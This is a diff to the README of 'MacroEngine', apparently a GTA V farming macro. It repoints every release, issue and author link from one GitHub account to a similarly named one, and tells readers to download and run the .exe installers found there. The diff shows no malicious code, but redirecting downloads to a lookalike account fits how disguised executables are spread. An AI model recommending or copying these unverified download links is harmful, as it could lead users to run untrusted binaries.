@@ -41,14 +41,14 @@
 
 ### Method 1: Installer (Recommended)
 
-1. Download `MacroEngine-Setup.exe` from [Releases](https://github.com/Multigames-studio/GTA-V-FARM/releases)
+1. Download `MacroEngine-Setup.exe` from [Releases](https://github.com/MultiGamesStudio-User/GTA-V-Farm/releases)
 2. Run the installer
 3. Launch from Start Menu or Desktop shortcut
 4. ✅ Done! Auto-updates are enabled
 
 ### Method 2: Portable (No Installation)
 
-1. Download `MacroEngine-Portable.exe` from [Releases](https://github.com/Multigames-studio/GTA-V-FARM/releases)
+1. Download `MacroEngine-Portable.exe` from [Releases](https://github.com/MultiGamesStudio-User/GTA-V-Farm/releases)
 2. Run it directly – no installation needed
 3. First run will extract dependencies (~200MB)
 
@@ -150,7 +150,7 @@ GTA V FARM/
 ### Crash on startup
 1. Run: `MacroEngine-Setup.exe --reset`
 2. Reinstall if issue persists
-3. Check [Issues](https://github.com/Multigames-studio/GTA-V-FARM/issues)
+3. Check [Issues](https://github.com/MultiGamesStudio-User/GTA-V-Farm/issues)
 
 ---
 
@@ -158,7 +158,7 @@ GTA V FARM/
 
 Auto-update checks every 24h. To manually update:
 1. **Menu → Check for Updates**
-2. Or download fresh from [Releases](https://github.com/Multigames-studio/GTA-V-FARM/releases)
+2. Or download fresh from [Releases](https://github.com/MultiGamesStudio-User/GTA-V-Farm/releases)
 
 ---
 
@@ -171,15 +171,15 @@ MIT License – See [LICENSE](./LICENSE)
 ## 🤝 Contributing
 
 Found a bug? Have ideas?
-- 🐛 [Report Issues](https://github.com/Multigames-studio/GTA-V-FARM/issues)
-- 💡 [Suggest Features](https://github.com/Multigames-studio/GTA-V-FARM/discussions)
-- 🍴 [Fork & PR](https://github.com/Multigames-studio/GTA-V-FARM)
+- 🐛 [Report Issues](https://github.com/MultiGamesStudio-User/GTA-V-Farm/issues)
+- 💡 [Suggest Features](https://github.com/MultiGamesStudio-User/GTA-V-Farm/discussions)
+- 🍴 [Fork & PR](https://github.com/MultiGamesStudio-User/GTA-V-Farm)
 
 ---
 
 ## 👨‍💻 Author
 
-**Multigames Studio** – [GitHub](https://github.com/Multigames-studio)
+**Multigames Studio** – [GitHub](https://github.com/MultiGamesStudio-User)
 
 ---
 
